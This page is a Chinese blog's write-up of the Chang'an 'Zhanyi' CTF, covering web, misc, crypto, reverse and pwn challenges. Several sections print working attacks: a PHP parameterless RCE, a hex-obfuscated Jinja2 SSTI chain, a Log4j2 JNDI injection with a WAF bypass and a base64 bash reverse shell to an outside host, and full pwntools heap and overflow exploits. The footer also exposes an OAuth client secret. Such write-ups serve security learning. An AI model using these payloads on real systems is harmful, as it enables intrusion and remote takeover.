@@ -1,0 +1,584 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>长安&#34;战疫&#34;网络安全赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="长安&#34;战疫&#34;网络安全赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Web
+RCE_No_Para
+无参RCE
+?1=system('tac flag.php');&amp;code=eval(current(current(get_defined_vars())));
+
+
+flask
+admin?stat..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              长安&#34;战疫&#34;网络安全赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-01-13
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web">Web</h1>
+<h2 id="rce_no_para">RCE_No_Para</h2>
+<p>无参RCE</p>
+<pre><code>?1=system('tac flag.php');&amp;code=eval(current(current(get_defined_vars())));
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/ab241c49f1414.png" alt="image-20220108112405025.png" loading="lazy"></figure>
+<h2 id="flask">flask</h2>
+<p><code>admin?static.js?</code></p>
+<p>然后发现传参点：?name=</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/5585963bed02c.png" alt="image-20220108111759531.png" loading="lazy"></figure>
+<p>简单试了下SSTI，发现过滤了引号等符号</p>
+<p>考虑attr结合16进制来绕过</p>
+<pre><code>{{a|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)}}
+</code></pre>
+<p>可以成功拿到基类</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/7c48b0dc231c6.png" alt="image-20220108112102681.png" loading="lazy"></figure>
+<p>然后剩下的直接打就行了</p>
+<pre><code>{{a|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27)()|attr(%27\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f%27)(186)|attr('\x5f\x5f\x69\x6e\x69\x74\x5f\x5f')|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x65\x76\x61\x6c')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x22\x29\x2e\x72\x65\x61\x64\x28\x29')}}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/a47863197e68c.png" alt="image-20220108112156788.png" loading="lazy"></figure>
+<h2 id="shiro">Shiro?</h2>
+<p>一开始看题目名称以为是Shiro反序列化，拿工具打了一下，发现能打通，但是很多命令执行都没回显</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/947a847c234d5.png" alt="1641628657487.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/72474e9e45090.png" alt="1641628690295.png" loading="lazy"></figure>
+<p>只能执行一个ls和whoami，一直以为可能是需要绕过沙箱之类的，后来想起来可能是Log4j2。</p>
+<p>之前自己也复现过一次:<code>https://le1a.gitee.io/posts/3e4e56bc/</code></p>
+<p>这次直接打，在云服务器上用工具起一个rmi服务，并且监听12345端口</p>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}&quot; -A &quot;101.43.66.67&quot;
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/74bb51ec263fe.png" alt="1641628865011.png" loading="lazy"></figure>
+<p>构造<code>${jndi:rmi://101.43.66.67:1099/qzhyfb}</code>填入用户名，密码随意，然后点击登录<img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/847dfa618f308.png" alt="1641628962753.png" loading="lazy"></p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/f44986777ec06.png" alt="1641628980847.png" loading="lazy"></figure>
+<p>发现有WAF，百度了一下Log4j2的Bypass，找到了这篇文章:<code>https://mp.weixin.qq.com/s/H1gH5ZtIAVpLPgmmUfJnaA</code></p>
+<p>用其中的第二条payload <code>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://101.43.66.67:1099/qzhyfb} </code>即可绕过</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/6f75c676435c2.png" alt="1641629152498.png" loading="lazy"></figure>
+<p>云服务器也收到了反弹的shell，cat flag即可获得flag</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/68f6bcaed46c2.png" alt="1641629233293.png" loading="lazy"></figure>
+<pre><code>flag{f8ab5b41f702bfc9a5bd7a2e2d3cd5d0}
+</code></pre>
+<h2 id="flag配送中心">Flag配送中心</h2>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/abe909e5582f0.png" alt="image-20220108154213629.png" loading="lazy"></figure>
+<p>很明显的提示了</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/da3a7001724ea.png" alt="image-20220108163141212.png" loading="lazy"></figure>
+<p>然后直接照着上面用HTTPoxy洞去打</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/7d08c6e682657.png" alt="image-20220108154614688.png" loading="lazy"></figure>
+<p>开个监听：</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/08dd581a819b8.png" alt="image-20220108154623918.png" loading="lazy"></figure>
+<p>flag为:</p>
+<pre><code>cazy{WE_4r3_f4mily_for3vEr}
+</code></pre>
+<h1 id="misc">Misc</h1>
+<h2 id="八卦迷宫">八卦迷宫</h2>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/1bc7597d34c20.png" alt="1641634400306.png" loading="lazy"></figure>
+<p>附件是一个迷宫图，先把迷宫走出去，一路上碰到的红色方块分别对应着<code>长安战疫，山河无恙</code>这八个字，把遇到的方块转为这些字的拼音的到flag</p>
+<pre><code>cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}
+</code></pre>
+<h2 id="西安加油">西安加油</h2>
+<p>下载附件，是一个流量包，先导出HTTP对象</p>
+<p>有一个secret(1).txt，里面base64解码是一个压缩包，通过如下脚本来得到这个压缩包</p>
+<pre><code class="language-python">import base64
+fin=open(&quot;secret.txt&quot;,&quot;r&quot;)
+fout=open('2.zip',&quot;wb&quot;)
+base64.decode(fin,fout)
+fin.close()
+fout.close()
+</code></pre>
+<p>打开压缩包，里面有很多张图片。HTTP导出来的文件中还有一个<code>hint.txt</code>，base32解码得到图片的一个排列顺序</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/3064baecbbc8e.png" alt="1641635910615.png" loading="lazy"></figure>
+<p>按照这个顺序，把这些图片依次拼接起来</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/72efe00db199c.png" alt="1641637959273.png" loading="lazy"></figure>
+<p>得到flag为:</p>
+<pre><code>cazy{make_XiAN_great_Again}
+</code></pre>
+<h2 id="无字天书">无字天书</h2>
+<p>下载附件，是一个流量包，还是先导出HTTP对象</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/a2be9b39db9d7.png" alt="1641632608608.png" loading="lazy"></figure>
+<p>在1(5).php中发现了压缩包的16进制，winhex创建一个空的文件，然后把这个16进制导入，保存为1.zip</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/81ff789de2e82.png" alt="1641632672902.png" loading="lazy"></figure>
+<p>里面有两个文件，里面都是空白字符，先来看这个key，里面的长度都不一样，排除摩斯和二进制，查到了一种编码叫<code>whitespace</code>，在线网站:https://vii5ard.github.io/whitespace/</p>
+<p>把key.ws里面的空白字符丢进去，run一下得到密钥:<code>XiAnWillBeSafe</code></p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/817af1d90f8b4.png" alt="1641632833324.png" loading="lazy"></figure>
+<p>而且flag.txt里面的内容 同样是空白字符，这就不由得想起SNOW加密，可以把字符隐藏到一个txt中，输出一个新的txt，这个新的txt里面就含有空白的隐藏字符。</p>
+<pre><code>snow.exe -p XiAnWillBeSafe -C flag.txt
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/7d45df6a06fbc.png" alt="1641632998622.png" loading="lazy"></figure>
+<p>得到flag为:</p>
+<pre><code>cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}
+</code></pre>
+<h1 id="crypto">Crypto</h1>
+<h2 id="no_math_no_cry">no_math_no_cry</h2>
+<p>由于len(flag)&lt;=80，所以m肯定比1&lt;&lt;500小，于是m=2* *500-iroot((c-0x0338470),2)[0]。</p>
+<pre><code class="language-python">from gmpy2 import *
+from Crypto.Util.number import *
+c=10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169
+print(long_to_bytes(2**500-iroot((c-0x0338470),2)[0]))
+##flag:b'cazy{1234567890_no_m4th_n0_cRy}'
+</code></pre>
+<h1 id="re">Re</h1>
+<h2 id="cute_doge">cute_doge</h2>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/71fd02985179f.png" alt="1641633529180.png" loading="lazy"></figure>
+<p>base64解码得到flag</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/fe995cdb99e2c.png" alt="1641633564933.png" loading="lazy"></figure>
+<p>flag为:</p>
+<pre><code>flag{Ch1na_yyds_cazy}
+</code></pre>
+<h1 id="pwn">Pwn</h1>
+<h2 id="pwn1">pwn1</h2>
+<p>很简单的签到pwn</p>
+<p>EXP：</p>
+<pre><code class="language-python">#!/usr/bin/env python
+#coding=utf-8
+
+from pwn import*
+
+
+ip = &quot;113.201.14.253&quot;
+port = 16088
+
+io = remote(ip,port)
+#io = process('./pwn1')
+#elf = ELF('./rheap')
+#libc = ELF('./libc-2.27.so')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+context(log_level='debug',os='linux',arch='i386')
+
+shell_addr = 0x8048540
+
+io.recvuntil(&quot;Gift:0x&quot;)
+buf = int(io.recv(8),16)
+success(hex(buf))
+
+
+io.recvuntil(&quot;\n&quot;)
+io.sendline(p32(0x8048540) + &quot;b&quot;*0x30 + p32(buf+4))
+
+
+io.interactive()
+</code></pre>
+<h2 id="pwn2">pwn2</h2>
+<p>add功能中存在offbyone漏洞。我们用堆风水构造出一个很大overlap，释放后进入unsortedbin，之后利用地址残留泄露出libc地址，最后劫持释放堆块的fd指针，劫持freehook即可</p>
+<p>EXP：</p>
+<pre><code class="language-python">#!/usr/bin/env python
+#coding=utf-8
+
+from pwn import*
+
+
+ip = &quot;113.201.14.253&quot;
+port = 16066
+
+io = remote(ip,port)
+#io = process('./pwn2')
+#elf = ELF('./rheap')
+libc = ELF('./libc-2.27.so')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+context(log_level='debug',os='linux',arch='amd64')
+
+
+def choice(c):
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(c))
+
+def add(size,content):
+	choice(1)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(size))
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(content)
+
+def edit(index,content):
+	choice(2)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(index))
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(content)
+
+def show(index):
+	choice(4)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(index))
+
+def free(index):
+	choice(3)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(index))	
+
+
+
+add(0x18,'A')
+add(0x400,'A')
+add(0x80,'A')
+add(0x80,'A')
+
+free(0)
+add(0x18,'A'*0x18 + b'\xa1')
+
+free(1)
+add(0x400,'A')
+show(2)
+
+leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+libc_base = leak - 96 - 0x10 - libc.sym['__malloc_hook']
+fh = libc_base + libc.sym['__free_hook']
+system = libc_base + libc.sym['system']
+success(hex(leak))
+success(hex(libc_base))
+
+add(0x80,'AA')
+
+add(0x18,'K')
+add(0x20,'A')
+add(0x20,'A')
+add(0x20,'A')
+
+free(5)
+
+add(0x18,'A'*0x18 + b'\x61')
+free(7)
+free(6)
+add(0x50,'A'*0x20 + p64(0) + p64(0x31) + p64(fh))
+add(0x20,'/bin/sh')
+add(0x20,p64(system))
+
+free(7)
+#gdb.attach(io)
+
+io.interactive()
+</code></pre>
+<h2 id="pwn3">pwn3</h2>
+<p>ubuntu16的题</p>
+<p>这里我是投机取巧用的ˆ符号</p>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/4d8bac6190730.png" alt="1641633441447.png" loading="lazy"></figure>
+<p>通过调试发现，当输入两次ˆˆ后，他的值与hp向减，就可以通过条件</p>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/f8329af43b076.png" alt="1641633460263.png" loading="lazy"></figure>
+<p>我们通过条件后进入这个逻辑</p>
+<figure data-type="image" tabindex="26"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/08/1fa68ef2fa6a0.png" alt="1641633480225.png" loading="lazy"></figure>
+<p>这段代码存在任意地址写</p>
+<p>最后我选择的是通过劫持exit hook为one gadget去getshell，中间卡了很长时间的是远程交互出来一点问题</p>
+<p>最后EXP:</p>
+<pre><code class="language-python">from pwn import *
+
+ip = &quot;113.201.14.253&quot;
+port = 16033
+io = remote(ip,port)
+#io = process('./Gpwn3')
+elf = ELF('./Gpwn3')
+libc = elf.libc
+context(log_level='debug', os='linux', arch='amd64')
+
+
+def choice(c):
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(c))
+
+def add(level):
+	choice(1)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(level)
+
+def up(level):
+	choice(2)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(level)
+
+def start():
+	choice(3)
+
+
+
+add('A'*35)
+up('1')
+
+up('ˆˆ')
+up('ˆˆ')
+
+io.recvuntil(&quot;:&quot;)
+io.sendline('3')
+
+io.recvuntil(&quot;Here's your reward: 0x&quot;)
+leak = int(io.recv(12),16)
+libc_base = leak - libc.sym['puts']
+system = libc_base + libc.sym['system']
+exit_hook = libc_base+0x5f0040+3848
+
+success(hex(leak))
+success(hex(libc_base))
+success(hex(exit_hook))
+
+
+one = libc_base + 0xf1247
+io.recvuntil(&quot;:&quot;)
+io.send(p64(exit_hook))
+
+io.recvuntil(&quot;!&quot;)
+io.send(p64(one))
+#gdb.attach(io,'b *$rebase(0x1064)')\
+'''
+up('1')
+up('ˆ')
+up('ˆ')
+up('ˆ')
+
+sleep(1)
+
+start()
+
+
+
+io.recvuntil(&quot;Here's your reward: 0x&quot;)
+leak = int(io.recv(12),16)
+libc_base = leak - libc.sym['puts']
+system = libc_base + libc.sym['system']
+exit_hook = libc_base+0x5f0040+3848
+
+success(hex(leak))
+success(hex(libc_base))
+success(hex(exit_hook))
+
+
+one = libc_base + 0xf1247
+io.recvuntil(&quot;:&quot;)
+io.send(p64(exit_hook))
+
+io.recvuntil(&quot;!&quot;)
+io.send(p64(one))
+
+#gdb.attach(io)
+'''
+io.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#rce_no_para">RCE_No_Para</a></li>
+<li><a href="#flask">flask</a></li>
+<li><a href="#shiro">Shiro?</a></li>
+<li><a href="#flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83">Flag配送中心</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#%E5%85%AB%E5%8D%A6%E8%BF%B7%E5%AE%AB">八卦迷宫</a></li>
+<li><a href="#%E8%A5%BF%E5%AE%89%E5%8A%A0%E6%B2%B9">西安加油</a></li>
+<li><a href="#%E6%97%A0%E5%AD%97%E5%A4%A9%E4%B9%A6">无字天书</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#no_math_no_cry">no_math_no_cry</a></li>
+</ul>
+</li>
+<li><a href="#re">Re</a>
+<ul>
+<li><a href="#cute_doge">cute_doge</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#pwn1">pwn1</a></li>
+<li><a href="#pwn2">pwn2</a></li>
+<li><a href="#pwn3">pwn3</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/CTFSHOW_大赛原题Wrietup/">
+              <h3 class="post-title">
+                CTFshow大赛原题Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
